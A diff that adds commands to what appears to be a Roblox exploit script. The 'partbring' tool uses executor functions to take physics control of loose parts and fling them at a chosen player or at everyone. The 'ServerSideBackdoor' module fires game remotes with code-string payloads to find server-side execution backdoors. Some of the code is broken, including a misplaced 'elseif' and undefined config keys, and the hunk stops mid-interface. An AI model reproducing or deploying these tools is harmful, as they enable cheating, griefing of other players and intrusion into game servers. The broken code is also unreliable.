@@ -32903,6 +32903,1371 @@ RegisterCommand({
     DoNotif("Rage Bot V2 loaded — RightAlt = toggle bot, RightCtrl = toggle evasion", 4)
     updateStatus()
 end)
+RegisterCommand({
+    Name        = "touchunanchored",
+    Aliases     = {"tuna"},
+    Description = "touch every unanchored part, use with part flinger",
+    ArgsDesc    = {},
+    Permissions = {},
+}, function(args, speaker)
+    local Players        = game:GetService("Players")
+    local RunService     = game:GetService("RunService")
+    local UserInputService = game:GetService("UserInputService")
+    local CONFIG = {
+        touchRadius     = 4,
+        scanRadius      = 0,
+        batchDelay      = 0.05,
+        minVolume       = 0.1,
+        blacklist       = { "HumanoidRootPart", "Torso", "Head", "UpperTorso", "LowerTorso",
+                            "LeftArm", "RightArm", "LeftLeg", "RightLeg",
+                            "Left Arm", "Right Arm", "Left Leg", "Right Leg",
+                            "AntiVoidPlatform", "VoidSpawn" },
+        keyNoCollide    = Enum.KeyCode.U,
+        keyToggleAuto   = Enum.KeyCode.P,
+        keyToggleVisual = Enum.KeyCode.I,
+    }
+    local player    = Players.LocalPlayer
+    local character = player.Character or player.CharacterAdded:Wait()
+    local rootPart  = character:WaitForChild("HumanoidRootPart")
+    player.CharacterAdded:Connect(function(c)
+        character = c
+        rootPart  = c:WaitForChild("HumanoidRootPart")
+    end)
+    local blacklistSet = {}
+    for _, v in ipairs(CONFIG.blacklist) do blacklistSet[v] = true end
+    local autoEnabled   = false
+    local visualEnabled = true
+    local highlights    = {}
+    local function clearHighlights()
+        for part, hl in pairs(highlights) do
+            pcall(function() hl:Destroy() end)
+        end
+        highlights = {}
+    end
+    local function highlightPart(part)
+        if highlights[part] then return end
+        local hl = Instance.new("SelectionBox")
+        hl.Adornee       = part
+        hl.Color3        = Color3.fromRGB(0, 200, 255)
+        hl.LineThickness = 0.04
+        hl.SurfaceTransparency = 0.6
+        hl.SurfaceColor3 = Color3.fromRGB(0, 200, 255)
+        hl.Parent        = game:GetService("CoreGui")
+        highlights[part] = hl
+    end
+    local function scanParts()
+        local found = {}
+        local function recurse(parent)
+            for _, obj in ipairs(parent:GetChildren()) do
+                if obj:IsA("BasePart") then
+                    if not obj.Anchored
+                        and not blacklistSet[obj.Name]
+                        and obj.Size.X * obj.Size.Y * obj.Size.Z >= CONFIG.minVolume
+                    then
+                        local isCharPart = false
+                        for _, p in ipairs(Players:GetPlayers()) do
+                            if p.Character and obj:IsDescendantOf(p.Character) then
+                                isCharPart = true
+                                break
+                            end
+                        end
+                        if not isCharPart then
+                            if CONFIG.scanRadius > 0 and rootPart then
+                                local dist = (obj.Position - rootPart.Position).Magnitude
+                                if dist <= CONFIG.scanRadius then
+                                    table.insert(found, obj)
+                                end
+                            else
+                                table.insert(found, obj)
+                            end
+                        end
+                    end
+                end
+                local isPlayerChar = false
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if p.Character == obj then isPlayerChar = true break end
+                end
+                if not isPlayerChar then
+                    recurse(obj)
+                end
+            end
+        end
+        recurse(game:GetService("Workspace"))
+        return found
+    end
+    local function touchPart(part)
+        if not rootPart or not rootPart.Parent then return end
+        if not part or not part.Parent then return end
+        local origin = rootPart.CFrame
+        rootPart.CFrame = CFrame.new(part.Position + Vector3.new(0, CONFIG.touchRadius, 0))
+        RunService.Heartbeat:Wait()
+        rootPart.CFrame = origin
+    end
+    local function scanAndTouchAll()
+        local parts = scanParts()
+        clearHighlights()
+        if #parts == 0 then
+            warn("[TouchScan] No unanchored parts found.")
+            return
+        end
+        warn(string.format("[TouchScan] Found %d unanchored parts — touching...", #parts))
+        for _, part in ipairs(parts) do
+            if visualEnabled then highlightPart(part) end
+            touchPart(part)
+            task.wait(CONFIG.batchDelay)
+        end
+        warn("[TouchScan] Done.")
+    end
+    local autoParts  = {}
+    local autoConn
+    local noCollideEnabled = false
+    local noCollideConn
+    local function applyNoCollide(part)
+        pcall(function() part.CanCollide = false end)
+    end
+    local function startNoCollide()
+        if noCollideConn then return end
+        warn("[TouchScan] No-collide ON — unanchored parts won't fling you")
+        noCollideConn = RunService.Heartbeat:Connect(function()
+            local parts = scanParts()
+            for _, part in ipairs(parts) do
+                applyNoCollide(part)
+            end
+        end)
+    end
+    local function stopNoCollide()
+        if noCollideConn then
+            noCollideConn:Disconnect()
+            noCollideConn = nil
+        end
+        warn("[TouchScan] No-collide OFF")
+    end
+    local function startAuto()
+        if autoConn then return end
+        warn("[TouchScan] Auto-touch ON")
+        autoConn = RunService.Heartbeat:Connect(function()
+            local parts = scanParts()
+            for _, part in ipairs(parts) do
+                if not autoParts[part] then
+                    autoParts[part] = true
+                    if visualEnabled then highlightPart(part) end
+                    task.spawn(function()
+                        touchPart(part)
+                    end)
+                end
+            end
+        end)
+    end
+    local function stopAuto()
+        if autoConn then
+            autoConn:Disconnect()
+            autoConn = nil
+        end
+        autoParts = {}
+        warn("[TouchScan] Auto-touch OFF")
+    end
+    UserInputService.InputBegan:Connect(function(input, gp)
+        if gp then return end
+        elseif input.KeyCode == CONFIG.keyNoCollide then
+            noCollideEnabled = not noCollideEnabled
+            if noCollideEnabled then startNoCollide() else stopNoCollide() end
+        elseif input.KeyCode == CONFIG.keyScanOnce then
+            scanAndTouchAll()
+        elseif input.KeyCode == CONFIG.keyToggleAuto then
+            autoEnabled = not autoEnabled
+            if autoEnabled then startAuto() else stopAuto() end
+        elseif input.KeyCode == CONFIG.keyToggleVisual then
+            visualEnabled = not visualEnabled
+            if not visualEnabled then
+                clearHighlights()
+                warn("[TouchScan] Highlights OFF")
+            else
+                warn("[TouchScan] Highlights ON")
+            end
+        end
+    end)
+    warn("—  U: no-collide  |  P: scan once  |  O: toggle auto  |  I: toggle highlights")
+end)
+RegisterCommand({
+    Name        = "partbring",
+    Aliases     = {"pb", "sendpart"},
+    Description = "WIP Sends unanchored parts to a target",
+    ArgsDesc    = {},
+    Permissions = {},
+}, function(args, speaker)
+    local TweenService = game:GetService("TweenService")
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local UserInputService = game:GetService("UserInputService")
+    local Workspace = game:GetService("Workspace")
+    local Debris = game:GetService("Debris")
+    local Camera = Workspace.CurrentCamera
+    local LocalPlayer = Players.LocalPlayer
+    LocalPlayer.ReplicationFocus = Workspace
+    pcall(function()
+    	game:GetService("CoreGui").RobloxGui["CoreScripts/NetworkPause"]:Destroy()
+    end)
+    if not getgenv().Network then
+    	getgenv().Network = { BaseParts = {} }
+    	RunService.Heartbeat:Connect(function()
+    		sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
+    	end)
+    end
+    local CONFIG = {
+    	UPDATE_INTERVAL = 0.01,
+    	MAX_PARTS = 800,
+    }
+    local TARGET_PARTS = {}
+    local CONNECTIONS = {}
+    local sendTarget = nil
+    local blackHoleActive = false
+    local spectateActive = false
+    local targetMode = "Players"
+    local cycleIndex = 1
+    local cycleConnection = nil
+    local spectateMonitorConnection = nil
+    local DescendantAddedConnection = nil
+    local originalCameraType = nil
+    local originalCameraSubject = nil
+    local lastUpdate = 0
+    local Folder = Instance.new("Folder", Workspace)
+    local AnchorPart = Instance.new("Part", Folder)
+    local Attachment1 = Instance.new("Attachment", AnchorPart)
+    AnchorPart.Anchored = false
+    AnchorPart.CanCollide = true
+    AnchorPart.Transparency = 1
+    local overlapParams = OverlapParams.new()
+    overlapParams.FilterType = Enum.RaycastFilterType.Exclude
+    overlapParams.MaxParts = 500
+    local function getPartsInRadius(centerPos, radius)
+    	local char = LocalPlayer.Character
+    	overlapParams.FilterDescendantsInstances = char and { char } or {}
+    	local parts = Workspace:GetPartBoundsInRadius(centerPos, radius, overlapParams)
+    	-- also sweep around the target so we grab parts near them too
+    	if sendTarget then
+    		local targetChar = sendTarget.Character
+    		local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
+    		if targetRoot then
+    			local targetParts = Workspace:GetPartBoundsInRadius(targetRoot.Position, CONFIG.RADIUS, overlapParams)
+    			for _, p in ipairs(targetParts) do
+    				table.insert(parts, p)
+    			end
+    		end
+    	end
+    	return parts
+    end
+    local function releasePart(part)
+    	local data = TARGET_PARTS[part]
+    	if not data then return end
+    	if data.conn then data.conn:Disconnect() end
+    	pcall(function()
+    		local bv = part:FindFirstChildOfClass("BodyVelocity")
+    		if bv then bv:Destroy() end
+    		if data.alignPos and data.alignPos.Parent then data.alignPos:Destroy() end
+    		if data.attachment and data.attachment.Parent then data.attachment:Destroy() end
+    		if data.torque and data.torque.Parent then data.torque:Destroy() end
+    	end)
+    	TARGET_PARTS[part] = nil
+    end
+    local function forcePart(part)
+    	if not part:IsA("BasePart") then return end
+    	if TARGET_PARTS[part] then return end
+    	if part.Anchored then return end
+    	if part.Parent and part.Parent:FindFirstChildOfClass("Humanoid") then return end
+    	if part.Parent and part.Parent:FindFirstChild("Head") then return end
+    	if part.Name == "Handle" then return end
+    	local count = 0
+    	for _ in pairs(TARGET_PARTS) do count += 1 end
+    	if count >= CONFIG.MAX_PARTS then return end
+    	pcall(function()
+    		for _, c in ipairs(part:GetChildren()) do
+    			if c:IsA("BodyMover") or c:IsA("RocketPropulsion")
+    				or c:IsA("LinearVelocity") or c:IsA("VectorForce")
+    				or c:IsA("BodyVelocity") or c:IsA("BodyForce") then
+    				c:Destroy()
+    			end
+    		end
+    	end)
+    	part.CanCollide = true
+    	part.Massless = false
+
+    	-- fire a BodyVelocity directly at the target right now
+    	local function launchAtTarget()
+    		if not sendTarget then return end
+    		local targetChar = sendTarget.Character
+    		local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
+    		if not targetRoot then return end
+    		pcall(function()
+    			-- remove old mover first
+    			local old = part:FindFirstChildOfClass("BodyVelocity")
+    			if old then old:Destroy() end
+    			local bv = Instance.new("BodyVelocity")
+    			bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
+    			local dir = (targetRoot.Position - part.Position).Unit
+    			bv.Velocity = dir * 500
+    			bv.Parent = part
+    		end)
+    	end
+
+    	launchAtTarget()
+
+    	local conn
+    	conn = RunService.Heartbeat:Connect(function()
+    		if not part.Parent then
+    			releasePart(part)
+    			return
+    		end
+    		if not blackHoleActive then
+    			releasePart(part)
+    			return
+    		end
+    		if sendTarget then
+    			local targetChar = sendTarget.Character
+    			local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
+    			if targetRoot then
+    				-- constantly re-aim the velocity so it tracks them if they move
+    				local bv = part:FindFirstChildOfClass("BodyVelocity")
+    				if bv then
+    					bv.Velocity = (targetRoot.Position - part.Position).Unit * 500
+    				else
+    					launchAtTarget()
+    				end
+    			end
+    		end
+    	end)
+    	TARGET_PARTS[part] = { conn = conn }
+    end
+    local function cleanupStaleParts()
+    	for part in pairs(TARGET_PARTS) do
+    		if not part.Parent then releasePart(part) end
+    	end
+    end
+    local function blackholeLoop()
+    	local now = tick()
+    	if now - lastUpdate < CONFIG.UPDATE_INTERVAL then return end
+    	lastUpdate = now
+    	if not blackHoleActive then return end
+    	cleanupStaleParts()
+    end
+    table.insert(CONNECTIONS, RunService.Heartbeat:Connect(blackholeLoop))
+    local function getPlayer(name)
+    	local query = name:lower()
+    	for _, p in ipairs(Players:GetPlayers()) do
+    		if p ~= LocalPlayer then
+    			if p.Name:lower():find(query, 1, true)
+    				or p.DisplayName:lower():find(query, 1, true) then
+    				return p
+    			end
+    		end
+    	end
+    end
+    local function getValidPlayers()
+    	local valid = {}
+    	for _, p in ipairs(Players:GetPlayers()) do
+    		if p ~= LocalPlayer and p.Character
+    			and p.Character:FindFirstChild("HumanoidRootPart") then
+    			table.insert(valid, p)
+    		end
+    	end
+    	return valid
+    end
+    local function isTargetValid(target)
+    	return target
+    		and target.Character
+    		and target.Character:FindFirstChildOfClass("Humanoid")
+    		and target.Character.Humanoid.Health > 0
+    end
+    local function startSpectating()
+    	if not isTargetValid(sendTarget) then return end
+    	local humanoid = sendTarget.Character:FindFirstChildOfClass("Humanoid")
+    	if not humanoid then return end
+    	if not originalCameraType then
+    		originalCameraType = Camera.CameraType
+    		originalCameraSubject = Camera.CameraSubject
+    	end
+    	Camera.CameraType = Enum.CameraType.Custom
+    	Camera.CameraSubject = humanoid
+    end
+    local function stopSpectating()
+    	if originalCameraType and originalCameraSubject then
+    		Camera.CameraType = originalCameraType
+    		Camera.CameraSubject = originalCameraSubject
+    	else
+    		Camera.CameraType = Enum.CameraType.Custom
+    		Camera.CameraSubject = LocalPlayer.Character
+    			and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    	end
+    	originalCameraType = nil
+    	originalCameraSubject = nil
+    end
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "BH_Gui"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = (pcall(function() return gethui() end) and gethui()) or LocalPlayer.PlayerGui
+    local Main = Instance.new("Frame")
+    Main.Size = UDim2.new(0, 240, 0, 160)
+    Main.Position = UDim2.new(0, 16, 0, 16)
+    Main.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
+    Main.BackgroundTransparency = 0.2
+    Main.BorderSizePixel = 0
+    Main.Active = true
+    Main.Draggable = true
+    Main.Parent = screenGui
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0, 10)
+    mainCorner.Parent = Main
+    local mainStroke = Instance.new("UIStroke")
+    mainStroke.Color = Color3.fromRGB(50, 50, 50)
+    mainStroke.Thickness = 1
+    mainStroke.Parent = Main
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Size = UDim2.new(1, 0, 0, 28)
+    titleLabel.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+    titleLabel.BackgroundTransparency = 0.1
+    titleLabel.BorderSizePixel = 0
+    titleLabel.Font = Enum.Font.Code
+    titleLabel.Text = "Part Flinger"
+    titleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    titleLabel.TextSize = 12
+    titleLabel.Parent = Main
+    local titleCorner = Instance.new("UICorner")
+    titleCorner.CornerRadius = UDim.new(0, 8)
+    titleCorner.Parent = titleLabel
+    local inputBox = Instance.new("TextBox")
+    inputBox.Size = UDim2.new(0, 148, 0, 30)
+    inputBox.Position = UDim2.new(0, 8, 0, 34)
+    inputBox.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
+    inputBox.BorderSizePixel = 0
+    inputBox.PlaceholderText = "player name..."
+    inputBox.PlaceholderColor3 = Color3.fromRGB(65, 65, 65)
+    inputBox.Text = ""
+    inputBox.TextColor3 = Color3.fromRGB(210, 210, 210)
+    inputBox.TextSize = 13
+    inputBox.Font = Enum.Font.Code
+    inputBox.ClearTextOnFocus = false
+    inputBox.Parent = Main
+    local inputCorner = Instance.new("UICorner")
+    inputCorner.CornerRadius = UDim.new(0, 6)
+    inputCorner.Parent = inputBox
+    local inputStroke = Instance.new("UIStroke")
+    inputStroke.Color = Color3.fromRGB(45, 45, 45)
+    inputStroke.Thickness = 1
+    inputStroke.Parent = inputBox
+    local modeBtn = Instance.new("TextButton")
+    modeBtn.Size = UDim2.new(0, 72, 0, 30)
+    modeBtn.Position = UDim2.new(0, 162, 0, 34)
+    modeBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    modeBtn.BorderSizePixel = 0
+    modeBtn.Font = Enum.Font.Code
+    modeBtn.Text = "Players"
+    modeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+    modeBtn.TextSize = 12
+    modeBtn.Parent = Main
+    local modeBtnCorner = Instance.new("UICorner")
+    modeBtnCorner.CornerRadius = UDim.new(0, 6)
+    modeBtnCorner.Parent = modeBtn
+    local bringBtn = Instance.new("TextButton")
+    bringBtn.Size = UDim2.new(0, 108, 0, 28)
+    bringBtn.Position = UDim2.new(0, 8, 0, 72)
+    bringBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    bringBtn.BorderSizePixel = 0
+    bringBtn.Font = Enum.Font.Code
+    bringBtn.Text = "Bring: Off"
+    bringBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+    bringBtn.TextSize = 12
+    bringBtn.Parent = Main
+    local bringBtnCorner = Instance.new("UICorner")
+    bringBtnCorner.CornerRadius = UDim.new(0, 6)
+    bringBtnCorner.Parent = bringBtn
+    local spectateBtn = Instance.new("TextButton")
+    spectateBtn.Size = UDim2.new(0, 108, 0, 28)
+    spectateBtn.Position = UDim2.new(0, 124, 0, 72)
+    spectateBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    spectateBtn.BorderSizePixel = 0
+    spectateBtn.Font = Enum.Font.Code
+    spectateBtn.Text = "Spectate: Off"
+    spectateBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+    spectateBtn.TextSize = 12
+    spectateBtn.Parent = Main
+    local spectateBtnCorner = Instance.new("UICorner")
+    spectateBtnCorner.CornerRadius = UDim.new(0, 6)
+    spectateBtnCorner.Parent = spectateBtn
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, -16, 0, 24)
+    statusLabel.Position = UDim2.new(0, 8, 0, 108)
+    statusLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    statusLabel.BackgroundTransparency = 0.1
+    statusLabel.BorderSizePixel = 0
+    statusLabel.Font = Enum.Font.Code
+    statusLabel.Text = "idle"
+    statusLabel.TextColor3 = Color3.fromRGB(80, 80, 80)
+    statusLabel.TextSize = 11
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    statusLabel.Parent = Main
+    local statusCorner = Instance.new("UICorner")
+    statusCorner.CornerRadius = UDim.new(0, 6)
+    statusCorner.Parent = statusLabel
+    local statusPadding = Instance.new("UIPadding")
+    statusPadding.PaddingLeft = UDim.new(0, 6)
+    statusPadding.Parent = statusLabel
+    local countLabel = Instance.new("TextLabel")
+    countLabel.Size = UDim2.new(1, -16, 0, 16)
+    countLabel.Position = UDim2.new(0, 8, 0, 136)
+    countLabel.BackgroundTransparency = 1
+    countLabel.Font = Enum.Font.Code
+    countLabel.Text = ""
+    countLabel.TextColor3 = Color3.fromRGB(60, 60, 60)
+    countLabel.TextSize = 10
+    countLabel.TextXAlignment = Enum.TextXAlignment.Left
+    countLabel.Parent = Main
+    local function setStatus(msg, color)
+    	statusLabel.Text = msg
+    	statusLabel.TextColor3 = color or Color3.fromRGB(80, 80, 80)
+    end
+    local function setTarget(player)
+    	sendTarget = player
+    	if player then
+    		setStatus("→ " .. player.Name .. " (" .. player.DisplayName .. ")", Color3.fromRGB(200, 80, 80))
+    	else
+    		setStatus("idle")
+    	end
+    end
+    local function stopBlackhole()
+    	blackHoleActive = false
+    	bringBtn.Text = "Bring: Off"
+    	bringBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    	if DescendantAddedConnection then
+    		DescendantAddedConnection:Disconnect()
+    		DescendantAddedConnection = nil
+    	end
+    	if cycleConnection then
+    		cycleConnection:Disconnect()
+    		cycleConnection = nil
+    	end
+    	for part in pairs(TARGET_PARTS) do releasePart(part) end
+    end
+    local function startBlackhole()
+    	if not sendTarget then return end
+    	blackHoleActive = true
+    	bringBtn.Text = "Bring: On"
+    	bringBtn.BackgroundColor3 = Color3.fromRGB(160, 35, 35)
+    	-- update Attachment1 to target immediately
+    	local targetChar = sendTarget.Character
+    	local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
+    	if targetRoot then Attachment1.WorldCFrame = targetRoot.CFrame end
+    	-- grab every single descendant in workspace right now
+    	task.spawn(function()
+    		for _, v in ipairs(Workspace:GetDescendants()) do
+    			forcePart(v)
+    		end
+    	end)
+    	-- also catch anything that spawns in after
+    	DescendantAddedConnection = Workspace.DescendantAdded:Connect(function(v)
+    		if blackHoleActive then
+    			task.spawn(function() forcePart(v) end)
+    		end
+    	end)
+    	if targetMode == "All" then
+    		cycleConnection = RunService.Heartbeat:Connect(function()
+    			if tick() % 3 < 0.05 then
+    				local players = getValidPlayers()
+    				if #players > 0 then
+    					cycleIndex = (cycleIndex % #players) + 1
+    					setTarget(players[cycleIndex])
+    				end
+    			end
+    		end)
+    	end
+    end
+    local function toggleSpectate()
+    	if not sendTarget then return end
+    	spectateActive = not spectateActive
+    	spectateBtn.Text = spectateActive and "Spectate: On" or "Spectate: Off"
+    	spectateBtn.BackgroundColor3 = spectateActive
+    		and Color3.fromRGB(40, 80, 140)
+    		or Color3.fromRGB(45, 45, 45)
+    	if spectateActive then
+    		startSpectating()
+    		if spectateMonitorConnection then spectateMonitorConnection:Disconnect() end
+    		spectateMonitorConnection = RunService.Heartbeat:Connect(function()
+    			if not spectateActive then
+    				spectateMonitorConnection:Disconnect()
+    				return
+    			end
+    			if not isTargetValid(sendTarget) then
+    				stopSpectating()
+    				spectateActive = false
+    				spectateBtn.Text = "Spectate: Off"
+    				spectateBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    			elseif Camera.CameraSubject
+    				~= sendTarget.Character:FindFirstChildOfClass("Humanoid") then
+    				startSpectating()
+    			end
+    		end)
+    	else
+    		stopSpectating()
+    		if spectateMonitorConnection then
+    			spectateMonitorConnection:Disconnect()
+    			spectateMonitorConnection = nil
+    		end
+    	end
+    end
+    table.insert(CONNECTIONS, RunService.Heartbeat:Connect(function()
+    	if blackHoleActive then
+    		local count = 0
+    		for _ in pairs(TARGET_PARTS) do count += 1 end
+    		countLabel.Text = "parts claimed: " .. count
+    	else
+    		countLabel.Text = ""
+    	end
+    end))
+    bringBtn.MouseButton1Click:Connect(function()
+    	if blackHoleActive then
+    		stopBlackhole()
+    	else
+    		if targetMode == "Players" then
+    			local p = getPlayer(inputBox.Text)
+    			if not p then
+    				setStatus("not found: " .. inputBox.Text, Color3.fromRGB(200, 80, 80))
+    				return
+    			end
+    			setTarget(p)
+    		else
+    			local players = getValidPlayers()
+    			if #players == 0 then
+    				setStatus("no valid players", Color3.fromRGB(200, 80, 80))
+    				return
+    			end
+    			setTarget(players[1])
+    		end
+    		startBlackhole()
+    	end
+    end)
+    spectateBtn.MouseButton1Click:Connect(toggleSpectate)
+    modeBtn.MouseButton1Click:Connect(function()
+    	targetMode = targetMode == "Players" and "All" or "Players"
+    	modeBtn.Text = targetMode
+    	inputBox.Visible = targetMode == "Players"
+    	if blackHoleActive then
+    		stopBlackhole()
+    		if targetMode == "All" then
+    			local players = getValidPlayers()
+    			if #players > 0 then
+    				setTarget(players[1])
+    				startBlackhole()
+    			end
+    		end
+    	end
+    end)
+    inputBox.FocusLost:Connect(function(enterPressed)
+    	if not enterPressed then return end
+    	local p = getPlayer(inputBox.Text)
+    	if p then
+    		inputBox.Text = p.Name
+    		if not blackHoleActive then
+    			setTarget(p)
+    		end
+    	else
+    		setStatus("not found: " .. inputBox.Text, Color3.fromRGB(200, 80, 80))
+    	end
+    end)
+    Players.PlayerRemoving:Connect(function(p)
+    	if p == sendTarget then
+    		if spectateActive then
+    			stopSpectating()
+    			spectateActive = false
+    			spectateBtn.Text = "Spectate: Off"
+    			spectateBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    		end
+    		if blackHoleActive and targetMode == "All" then
+    			local players = getValidPlayers()
+    			if #players > 0 then
+    				setTarget(players[1])
+    			else
+    				stopBlackhole()
+    				setStatus("no players left")
+    			end
+    		elseif blackHoleActive then
+    			stopBlackhole()
+    			setStatus("target left")
+    		else
+    			setTarget(nil)
+    		end
+    	end
+    end)
+    local guiVisible = true
+    UserInputService.InputBegan:Connect(function(input, gpe)
+    	if gpe then return end
+    	if input.KeyCode == Enum.KeyCode.RightControl then
+    		guiVisible = not guiVisible
+    		local t = guiVisible and 0.05 or 1
+    		TweenService:Create(Main, TweenInfo.new(0.25), { BackgroundTransparency = t }):Play()
+    		for _, child in ipairs(Main:GetDescendants()) do
+    			if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
+    				TweenService:Create(child, TweenInfo.new(0.25), {
+    					TextTransparency = guiVisible and 0 or 1,
+    					BackgroundTransparency = guiVisible and 0.05 or 1,
+    				}):Play()
+    			end
+    		end
+    		Main.Active = guiVisible
+    		Main.Draggable = guiVisible
+    	end
+    end)
+    setStatus("idle")
+end)
+Modules.ServerSideBackdoor = {
+    State = {
+        IsOpen = false,
+        ActiveRemote = nil,
+        FoundRemotes = {},
+        ScanHistory = {},
+        LastScan = 0,
+        UI = nil,
+        IsScanning = false,
+        TestedRemotes = {}
+    },
+    Config = {
+        AutoScan = true,
+        ScanTimeout = 10,
+        TestPayloads = true,
+        SaveHistory = true,
+        ShowDebug = false,
+        ScanDepth = "deep",
+        TargetNames = {
+            "ExecuteRemote", "G_Execute", "ServerSide", "RemoteEvent",
+            "DataRemote", "Handshake", "Execute", "MessagingService",
+            "Remotes", "Network", "MainRemote", "VibeRemote",
+            "Communicate", "Bridge", "Gate", "H_E_L_P", "Request",
+            "AdminRemote", "CommandRemote", "OwnerRemote", "DevRemote",
+            "BackdoorRemote", "SystemRemote", "CoreRemote", "MasterRemote",
+            "SecureRemote", "AuthRemote", "ValidateRemote", "VerifyRemote",
+            "RE_", "RF_", "Event_", "Function_", "Remote_",
+            "Server", "Client", "Handler", "Manager", "Controller"
+        },
+        TestCommands = {
+            "print('SSBackdoorTest')",
+            "game:GetService('Workspace')",
+            "return true",
+            "_G.BackdoorTest = true"
+        },
+        BlacklistedRemotes = {
+            "DefaultChatSystemChatEvents",
+            "SayMessageRequest",
+            "OnNewMessage",
+            "OnMessageDoneFiltering",
+            "CharacterSoundEvent"
+        }
+    }
+}
+local function make(class, props, parent)
+    local obj = Instance.new(class)
+    for k, v in pairs(props) do
+        pcall(function() obj[k] = v end)
+    end
+    if parent then obj.Parent = parent end
+    return obj
+end
+local function corner(r, p)
+    Instance.new("UICorner", p).CornerRadius = UDim.new(0, r)
+end
+local function stroke(t, col, p)
+    local s = Instance.new("UIStroke", p)
+    s.Thickness = t
+    s.Color = col
+end
+function Modules.ServerSideBackdoor:_debugLog(msg)
+    if self.Config.ShowDebug then
+        print("[SS Backdoor]", msg)
+    end
+end
+function Modules.ServerSideBackdoor:_isBlacklisted(remoteName)
+    for _, blacklisted in ipairs(self.Config.BlacklistedRemotes) do
+        if remoteName:find(blacklisted) then
+            return true
+        end
+    end
+    return false
+end
+function Modules.ServerSideBackdoor:_testRemote(remote)
+    if self.State.TestedRemotes[remote] then
+        return self.State.TestedRemotes[remote]
+    end
+    local canFire = pcall(function()
+        remote:FireServer()
+    end)
+    if not canFire then
+        self.State.TestedRemotes[remote] = false
+        return false
+    end
+    if self.Config.TestPayloads then
+        for _, cmd in ipairs(self.Config.TestCommands) do
+            local success = pcall(function()
+                remote:FireServer(cmd)
+            end)
+            if success then
+                self:_debugLog("Remote passed test: " .. remote:GetFullName())
+                self.State.TestedRemotes[remote] = true
+                return true
+            end
+        end
+    end
+    self.State.TestedRemotes[remote] = canFire
+    return canFire
+end
+function Modules.ServerSideBackdoor:_scanForRemotes()
+    self.State.IsScanning = true
+    self.State.FoundRemotes = {}
+    local startTime = tick()
+    local scanned = 0
+    local found = 0
+    DoNotif("Scanning for backdoor remotes...", 2)
+    task.spawn(function()
+        for _, descendant in ipairs(game:GetDescendants()) do
+            if tick() - startTime > self.Config.ScanTimeout then
+                self:_debugLog("Scan timeout reached")
+                break
+            end
+            scanned = scanned + 1
+            if descendant:IsA("RemoteEvent") or descendant:IsA("RemoteFunction") then
+                local remoteName = descendant.Name
+                if self:_isBlacklisted(remoteName) then
+                    continue
+                end
+                local matched = false
+                for _, pattern in ipairs(self.Config.TargetNames) do
+                    if remoteName:lower():find(pattern:lower()) then
+                        matched = true
+                        break
+                    end
+                end
+                if self.Config.ScanDepth == "exhaustive" then
+                    matched = true
+                end
+                if matched then
+                    local isExploitable = self:_testRemote(descendant)
+                    if isExploitable then
+                        found = found + 1
+                        table.insert(self.State.FoundRemotes, {
+                            Remote = descendant,
+                            Name = remoteName,
+                            FullPath = descendant:GetFullName(),
+                            Type = descendant.ClassName,
+                            Parent = descendant.Parent and descendant.Parent.Name or "nil",
+                            FoundAt = tick()
+                        })
+                        self:_debugLog("Found exploitable: " .. remoteName)
+                    end
+                end
+            end
+            if scanned % 100 == 0 then
+                task.wait()
+            end
+        end
+        if self.Config.SaveHistory then
+            table.insert(self.State.ScanHistory, {
+                Time = os.date("%X"),
+                Found = found,
+                Scanned = scanned,
+                Duration = tick() - startTime
+            })
+        end
+        self.State.LastScan = tick()
+        self.State.IsScanning = false
+        if #self.State.FoundRemotes > 0 then
+            self.State.ActiveRemote = self.State.FoundRemotes[1].Remote
+            DoNotif(string.format("Found %d backdoor(s)! Active: %s", found, self.State.FoundRemotes[1].Name), 4)
+        else
+            DoNotif("No backdoors found in this game.", 3)
+        end
+        if self.State.UI then
+            self:_updateRemoteList()
+            self:_updateStatus()
+        end
+        print("=== Backdoor Scan Complete ===")
+        print(string.format("Scanned: %d objects", scanned))
+        print(string.format("Found: %d exploitable remotes", found))
+        print(string.format("Time: %.2fs", tick() - startTime))
+        if found > 0 then
+            print("\nExploitable Remotes:")
+            for i, data in ipairs(self.State.FoundRemotes) do
+                print(string.format("  [%d] %s (%s) - %s", i, data.Name, data.Type, data.FullPath))
+            end
+        end
+        print("=============================")
+    end)
+end
+function Modules.ServerSideBackdoor:_createUI()
+    local oldUI = CoreGui:FindFirstChild("SSBackdoorUI_Zuka")
+    if oldUI then oldUI:Destroy() end
+    local ScreenGui = make("ScreenGui", {
+        Name = "SSBackdoorUI_Zuka",
+        ResetOnSpawn = false,
+        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+        DisplayOrder = 9999
+    }, CoreGui)
+    local MainFrame = make("Frame", {
+        Size = UDim2.fromOffset(600, 400),
+        Position = UDim2.new(0.5, -300, 0.5, -200),
+        BackgroundColor3 = Color3.fromRGB(20, 20, 25),
